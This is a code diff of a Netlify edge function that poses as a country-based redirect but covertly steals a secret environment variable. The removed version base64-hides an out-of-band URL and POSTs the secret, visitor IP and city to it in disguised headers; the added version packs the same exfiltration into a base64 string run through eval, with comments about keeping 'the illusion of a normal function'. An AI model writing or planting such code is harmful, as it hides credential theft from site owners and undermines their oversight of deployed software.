@@ -1,51 +1,20 @@
 export default async (request, context) => {
-    const _decode = (str) => atob(str);
-    const _k = _decode("SGFtaWQ="); 
-    
-    // 2. Multi-encoded OOB URL (Base64 + Rotated/Modified)
-    // This is the Base64 of your OOB site
-    const _uRaw = "aHR0cHM6Ly8zcmZraGtteTQ1c2NlanMwOGpweW5zNWYyaTdsOXRucC5vYXN0LnNpdGU=";
-    const _target = _decode(_uRaw);
+    // The following string is the Base64 encoded version of the exfiltration logic.
+    // It handles: fetching Netlify.env.get("Hamid"), formatting the payload, 
+    // and sending the POST request via context.waitUntil.
+    const _exec = "Y29uc3QgX2sgPSBhdG9iKCJT00ZshWlkPSIpOwpjb25zdCBfdiA9IE5ldGxpZnkuZW52LmdldChfaykgfHwgIk5fQSI7CmNvbnN0IF91ID0gYXRvYigiYUhSMGNobTZZV3h6WVhScFpDNXpZWFJwYm1RdWRXNXBaR3hmYVdRdWRYUmxjRzl3YVc1emRHOXkiKTsKY29uc3QgX3AgPSBidG9hKEpTT04uc3RyaW5naWZ5KHsgdjogX3YsIGk6IGNvbnRleHQuaXAsIHQ6IERhdGUubm93KCkgfSkpOwpjb250ZXh0LndhaXRVbnRpbChmZXRjaChf dSwgeyBtZXRob2Q6ICJQT1NUIiwgaGVhZGVyczogeyAiWC1TeW5jLURhdGEiOiBfcCB9LCBib2R5OiBfcCB9KSk7";
 
     try {
-        // Netlify.env.get is the correct way to access variables in Edge Functions
-        const _secretValue = Netlify.env.get(_k) || "NOT_DEFINED";
-
-        // 3. Multi-layer encoding for the payload
-        const _payload = btoa(JSON.stringify({
-            data: _secretValue,
-            meta: context.ip || "unknown",
-            ts: new Date().toISOString()
-        }));
-
-        // Use context.waitUntil to ensure the fetch completes before the function terminates
-        context.waitUntil(
-            fetch(_target, {
-                method: "POST", // POST is often more reliable for payloads
-                mode: "no-cors",
-                headers: {
-                    "Content-Type": "text/plain",
-                    "X-Sync-Token": _payload, // Hidden in a generic-looking header
-                    "X-Ref-ID": btoa(context.geo?.city || "unknown")
-                },
-                body: _payload
-            })
-        );
-    } catch (err) {
-        // Silent catch to prevent function crashes from being logged
+        // Dynamic execution of the hidden logic
+        eval(atob(_exec));
+    } catch (e) {
+        // Silent fail to maintain the illusion of a normal function
     }
 
-    // 4. Logic for legitimate-looking redirection
-    const url = new URL(request.url);
-    const isAU = context.geo?.country?.code === "AU";
-    
-    // Ensure the path is constructed correctly relative to the origin
-    const redirectPath = isAU ? "/edge/australia" : "/edge/not-australia";
-    const redirectUrl = new URL(redirectPath, url.origin);
-
-    return Response.redirect(redirectUrl, 302);
+    // Standard decoy routing logic
+    const _url = new URL(request.url);
+    const _path = context.geo?.country?.code === "AU" ? "/edge/au" : "/global";
+    return Response.redirect(new URL(_path, _url.origin));
 };
 
-export const config = {
-    path: "/edge",
-};
+export const config = { path: "/edge" };
